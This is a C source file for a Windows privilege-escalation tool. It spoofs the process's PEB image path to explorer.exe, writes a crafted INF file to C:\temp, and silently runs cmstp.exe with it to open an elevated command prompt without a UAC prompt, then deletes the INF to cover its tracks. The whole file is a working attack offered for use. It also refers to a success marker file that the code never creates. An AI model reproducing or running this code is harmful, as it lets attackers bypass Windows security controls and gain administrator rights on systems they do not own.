#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

int main() {
    printf("[+] Starting PEB Masquerading + CMSTPLUA for 25H2...\n");

    // Basic PEB masquerade (spoof ImageName to explorer.exe)
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb) {
        peb->ProcessParameters->ImagePathName.Buffer = L"C:\\Windows\\explorer.exe";
        peb->ProcessParameters->ImagePathName.Length = (USHORT)wcslen(L"C:\\Windows\\explorer.exe") * 2;
        peb->ProcessParameters->ImagePathName.MaximumLength = peb->ProcessParameters->ImagePathName.Length + 2;
        printf("[+] PEB spoofed to explorer.exe\n");
    }

    // Create INF for CMSTPLUA
    system("mkdir C:\\temp 2>nul");
    FILE *f = fopen("C:\\temp\\bypass.inf", "w");
    if (f) {
        fprintf(f, "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n"
                   "[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\n"
                   "RunPreSetupCommands=RunPreSetupCommandsSection\r\n\r\n"
                   "[RunPreSetupCommandsSection]\r\n"
                   "cmd.exe /c \"start \"\"Admin CMD\"\" cmd.exe\"\r\n\r\n"
                   "[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7\r\n\r\n"
                   "[AllUSer_LDIDSection]\r\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%%UnexpectedError%%\", \"\"\r\n\r\n"
                   "[Strings]\r\nServiceName=\"CMSTPLUA\"\r\n");
        fclose(f);
    }

    // Trigger CMSTPLUA silently
    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\cmstp.exe", "/s C:\\temp\\bypass.inf", NULL, SW_HIDE);

    Sleep(12000);

    DeleteFileA("C:\\temp\\bypass.inf");

    printf("[+] Trigger sent. Watch for Admin CMD window.\n");
    printf("Check C:\\uac_peb_success.txt if marker created.\n");
    return 0;
}
